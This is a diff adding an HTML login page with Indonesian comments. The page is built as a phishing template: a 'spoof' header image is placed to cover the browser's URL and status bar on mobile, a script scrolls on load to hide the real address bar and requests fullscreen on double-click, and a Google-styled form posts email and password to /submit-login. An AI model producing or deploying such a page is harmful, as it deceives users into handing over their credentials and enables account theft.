@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login Page</title>
+    <style>
+        /* Global Style */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh; /* Pastikan body mengisi seluruh layar */
+            display: flex;
+            flex-direction: column;
+            justify-content: center; /* Vertikal tengah */
+            align-items: center; /* Horizontal tengah */
+            background-color: #fff; /* Pastikan background halaman putih */
+        }
+
+        /* Header Bar Style (Spoof image as background) */
+        .header-bar {
+            width: 100%;
+            height: 100px; /* Menentukan tinggi untuk header */
+            background-image: url('headbar-spoof.jpg');
+            background-size: contain; /* Memastikan gambar muat tanpa terpotong */
+            background-position: top center; /* Posisi gambar di tengah secara horizontal dan bagian atas secara vertikal */
+            background-repeat: no-repeat; /* Gambar tidak diulang */
+            position: absolute; /* Posisi gambar tetap di atas halaman */
+            top: 0;
+            left: 0;
+            z-index: 1; /* Menempatkan gambar header di belakang form */
+        }
+
+        /* Login Form Style */
+        .login-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: calc(100vh - 100px); /* Memastikan form login tetap di tengah layar setelah mengurangi header */
+            width: 100%;
+            z-index: 2; /* Menempatkan form login di atas header */
+            position: relative;
+            background-color: #fff; /* Pastikan background form juga putih */
+        }
+
+        .login-box {
+            background-color: white;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+            z-index: 3; /* Form login akan berada di atas header */
+        }
+
+        .login-box h2 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #333;
+        }
+
+        .login-box input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .login-box button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4285f4; /* Google Blue */
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        .login-box button:hover {
+            background-color: #357ae8;
+        }
+
+        /* Untuk menjaga header agar menutupi URL dan status bar di perangkat mobile */
+        @media screen and (max-width: 768px) {
+            .header-bar {
+                height: 120px; /* Menambah tinggi header sedikit untuk memberi ruang di perangkat mobile */
+                top: 0; /* Mengatur agar header menutupi bagian atas halaman */
+            }
+            body {
+                margin-top: 0; /* Menghindari margin pada body yang mengganggu tampilan */
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Header Bar with spoof image as background -->
+    <div class="header-bar">
+        <!-- Gambar spoof akan menjadi background di bagian atas halaman -->
+    </div>
+
+    <!-- Login Form -->
+    <div class="login-container">
+        <div class="login-box">
+            <h2>Login</h2>
+            <form action="/submit-login" method="POST">
+                <input type="email" name="email" placeholder="Email" required>
+                <input type="password" name="password" placeholder="Password" required>
+                <button type="submit">Login</button>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        // Menyembunyikan address bar dengan scroll otomatis setelah halaman dimuat
+        window.addEventListener("load", function() {
+            window.scrollTo(0, 1);
+        });
+
+        // Menambahkan event listener untuk meminta fullscreen mode
+        document.addEventListener("dblclick", async () => {
+            try {
+                // Meminta mode fullscreen
+                if (document.documentElement.requestFullscreen) {
+                    await document.documentElement.requestFullscreen();
+                } else if (document.documentElement.mozRequestFullScreen) { // Firefox
+                    await document.documentElement.mozRequestFullScreen();
+                } else if (document.documentElement.webkitRequestFullscreen) { // Chrome, Safari & Opera
+                    await document.documentElement.webkitRequestFullscreen();
+                } else if (document.documentElement.msRequestFullscreen) { // IE/Edge
+                    await document.documentElement.msRequestFullscreen();
+                }
+            } catch (error) {
+                console.error("Fullscreen error:", error);
+            }
+        });
+    </script>
+
+</body>
+</html>
